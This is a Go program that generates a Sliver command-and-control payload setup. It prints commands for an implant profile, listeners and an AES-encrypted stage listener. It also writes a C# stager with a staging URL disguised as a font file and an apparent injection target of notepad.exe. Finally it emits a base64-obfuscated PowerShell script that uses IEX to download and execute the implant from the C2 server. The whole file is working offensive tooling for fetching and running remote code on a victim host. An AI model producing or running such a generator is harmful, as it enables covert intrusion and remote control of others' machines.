package main

import (
	"bufio"
	cf "github.com/thepcn3rd/goAdventures/projects/commonFunctions"
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"flag"
	"fmt"
	"os"
	"strings"
)

/*
Purpose:
Build a sliver payload generator

Setup the Environment

go env -w GOROOT="/usr/lib/go"
go env -w GOPATH="/home/thepcn3rd/go/workspaces/sliverPayloadGenerator"

Make the directories - src
Copy the commonFunctions folder into the src directory so that it can be referenced

// To cross compile for linux
GOOS=linux GOARCH=amd64 CGO_ENABLED=0 go build -o generator.bin -ldflags "-w -s" main.go

// To cross compile windows
GOOS=windows GOARCH=amd64 go build -o generator.exe -ldflags "-w -s" main.go

Build a config.json file with the following:
Assumption that the sites are https://.  Do not include the https:// in the URLs
{
	"sliverServer": "10.27.20.200",
	"listenerPort" : "18443",
	"stageListenerPort" : "8443",
	"serverCRT": "keys/my.crt",
	"serverKey": "keys/my.key",
	"csharpFile": "coolrunnings.woff",
	"csharpTargetBinary": "notepad.exe"
}

Example JSON config file used to generate new certificates
{
        "DNSNames": [
                "blog.example.com",
                "www.example.com"
        ],
        "Org": "Example Inc",
        "OrgUnit": "",
        "CommonName": "example.com",
        "City": "Lewiston",
        "State": "ID",
        "Country": "US",
        "Email": "admin@example.com"
}


References:


*/

type Configuration struct {
	SliverServer       string `json:"sliverServer"`
	ListenerPort       string `json:"listenerPort"`
	StageListenerPort  string `json:"stageListenerPort"`
	ServerCRT          string `json:"serverCRT"`
	ServerKey          string `json:"serverKey"`
	CSharpFile         string `json:"csharpFile"`
	CSharpTargetBinary string `json:"csharpTargetBinary"`
}

func readConfigs(configPtr string) Configuration {
	// Read the config.json file and parse the parameters
	fmt.Println("Loading the following config file: " + configPtr)
	configFile, err := os.Open(configPtr)
	cf.CheckError("Unable to open the configuration file", err, true)
	defer configFile.Close()
	decoder := json.NewDecoder(configFile)
	var config Configuration
	if err := decoder.Decode(&config); err != nil {
		cf.CheckError("Unable to decode the configuration file", err, true)
	}
	configFile.Close()

	// Read the certconfig.json file
	cf.CreateDirectory("/keys")
	fileExists := cf.FileExists("/keys/certConfig.json")
	if fileExists == false {
		cf.CreateCertConfigFile()
	}

	// if server.crt file exists do not create a new one
	serverFileExists := cf.FileExists("/keys/server.crt")
	if serverFileExists == false {
		cf.CreateCerts()
	}
	return config
}

func generateRandomHex(length int) string {
	bytes := make([]byte, length/2)
	_, err := rand.Read(bytes)
	cf.CheckError("Unable to generate random hex", err, true)
	return hex.EncodeToString(bytes)
}

func generateRandomASCII(length int) string {
	const asciiChars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	bytes := make([]byte, length)
	_, err := rand.Read(bytes)
	cf.CheckError("Unable to generate random bytes", err, true)
	for i := 0; i < length; i++ {
		bytes[i] = asciiChars[int(bytes[i])%len(asciiChars)]
	}
	return string(bytes)
}

func parseCSharp(urlFile string, targetBinary string, aesKey string, aesIV string) {
	csharpFilename := "csharp.txt"
	csharpNewFileName := "csharpNew.txt"
	csharpExists := cf.FileExists("/" + csharpFilename)
	if csharpExists == false {
		fmt.Printf("Unable to locate the csharp.txt file to modify, restore and rerun...")
		os.Exit(0)
	}
	fileCsharp, err := os.Open(csharpFilename)
	cf.CheckError("Unable to open the "+csharpFilename+"File", err, true)
	defer fileCsharp.Close()

	fileNewCSharp, err := os.Create(csharpNewFileName)
	cf.CheckError("Unable to open the "+csharpNewFileName+"File", err, true)
	defer fileNewCSharp.Close()

	scanner := bufio.NewScanner(fileCsharp)
	for scanner.Scan() {
		line := scanner.Text()
		line = strings.ReplaceAll(line, "pythonReplaceURL", urlFile)
		line = strings.ReplaceAll(line, "pythonReplaceTargetBinary", targetBinary)
		line = strings.ReplaceAll(line, "pythonReplaceAESKey", aesKey)
		line = strings.ReplaceAll(line, "pythonReplaceAESIV", aesIV)
		// Try with WriteString
		fileNewCSharp.Write([]byte(line + "\r\n"))
		//fmt.Println(line)
		cf.CheckError("Unable to write the string to the file", err, true)
	}

}

// Creates a hex byte array for the powershell script
func asciiToHex(ascii string) string {
	hexEncodedString := ""
	for _, char := range ascii {
		hexEncodedString += fmt.Sprintf("0x%s,", hex.EncodeToString([]byte(string(char))))
	}
	return hexEncodedString[:len(hexEncodedString)-1]
}

// Create the powershell file for execution...
func createPwshFile() {
	csharpNewTXT := "csharpNew.txt"
	fileContent, err := os.Open(csharpNewTXT)
	cf.CheckError("Unable to open csharpNew.txt", err, true)
	defer fileContent.Close()

	// Convert os.File to byte slice
	stat, _ := fileContent.Stat()
	byteSlice := make([]byte, stat.Size())
	_, err = bufio.NewReader(fileContent).Read(byteSlice)
	encodedContent := base64.StdEncoding.EncodeToString(byteSlice)

	pwshFile, err := os.Create("pwsh.ps1")
	defer pwshFile.Close()
	pwshFile.WriteString("$b64code = \"" + encodedContent + "\"\n")
	pwshFile.WriteString("$code = [Text.Encoding]::Utf8.GetString([Convert]::FromBase64String($b64code))\n")
	pwshFile.WriteString("Add-Type -TypeDefinition $code -Language CSharp\n")
	pwshFile.WriteString("IEX \"[MyLibrary.Class1]::DownloadAndExecute()\"\n")
	//fmt.Printf("%s", encodedContent)
	pwshFile.Close()

}

func main() {
	ConfigPtr := flag.String("config", "config.json", "Configuration file to load for the proxy")
	flag.Parse()

	// Read the configuration file and setup/configure the 	certificates that are used
	config := readConfigs(*ConfigPtr)

	randomImplantFilename := "sliver-windows-implant-" + generateRandomHex(8)
	aesEncryptionKey := generateRandomASCII(32)
	aesEncryptionIV := generateRandomASCII(16)
	fmt.Printf("Random Implact Filename: %s\n", randomImplantFilename)
	fmt.Printf("AES Encryption Key: %s\n", aesEncryptionKey)
	hexEncryptionKey := asciiToHex(aesEncryptionKey)
	fmt.Printf("Hex Encoded Encryption Key: %s\n", hexEncryptionKey)
	fmt.Printf("AES Encryption IV: %s\n", aesEncryptionIV)
	hexEncryptionIV := asciiToHex(aesEncryptionIV)
	fmt.Printf("Hex Encoded Encryption IV: %s\n", hexEncryptionIV)

	// Build the profile
	urlListener := "https://" + config.SliverServer + ":" + config.ListenerPort
	fmt.Printf("\nRun the following command to build the profile...\n")
	fmt.Printf("> profiles new -b %s --format shellcode --arch amd64 %s\n", urlListener, randomImplantFilename)

	// Create the Listener
	createListenerCommand := "https -L " + config.SliverServer
	createListenerCommand += " -l " + config.ListenerPort
	createListenerCommand += " -c keys/server.crt"
	createListenerCommand += " -k keys/server.key"
	fmt.Printf("\nCreate the listener with the following command...\n")
	fmt.Printf("> %s\n", createListenerCommand)

	// Create the Stage Listener
	urlStageListener := "http://" + config.SliverServer + ":" + config.StageListenerPort
	csharpURL := urlStageListener + "/" + config.CSharpFile
	createStageListener := "stage-listener --url " + urlStageListener
	createStageListener += " --profile " + randomImplantFilename
	createStageListener += " -c keys/server.crt -k keys/server.key"
	createStageListener += " -C deflate9"
	createStageListener += " --aes-encrypt-key " + aesEncryptionKey
	createStageListener += " --aes-encrypt-iv " + aesEncryptionIV
	fmt.Printf("\nCreate the Stage Listener with the following command...\n")
	fmt.Printf("> %s\n", createStageListener)

	// Modify the csharp.txt and create csharpNew.txt
	// Create a new powershell script to be executed to connect to the above
	fmt.Printf("\nCreated a new powershell script called pwsh.ps1 to be executed on the host\n")
	parseCSharp(csharpURL, config.CSharpTargetBinary, hexEncryptionKey, hexEncryptionIV)
	createPwshFile()
}
